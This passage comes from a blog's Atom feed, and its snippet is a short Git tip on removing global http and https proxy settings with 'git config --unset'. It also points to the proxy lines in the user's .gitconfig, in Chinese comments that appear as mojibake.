class="comment">#å–æ¶ˆä»£ç†</span></span><br><span class="line">git config --global --<span class="built_in">unset</span> http.proxy</span><br><span class="line"></span><br><span class="line">git config --global --<span class="built_in">unset</span> https.proxy</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰“å¼€c:\Users\å½“å‰ç”¨æˆ·é‡Œçš„.gitconfigæ–‡ä»¶(è¿™ä¸ªé»˜è®¤æ˜¯éšè—æ–‡ä»¶),</span></span><br><span class="line"><span class="comment">#å°†é‡Œé¢å…³äºproxyçš„è¡Œåˆ æ‰</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=</summary>
      
    
    
    
    <category term="Git" scheme="https://x1a0.net/categories/Git/"/>
    
    
    <category term="Git" scheme="https://x1a0.net/tags/Git/"/>
    
  </entry>
  
</feed>
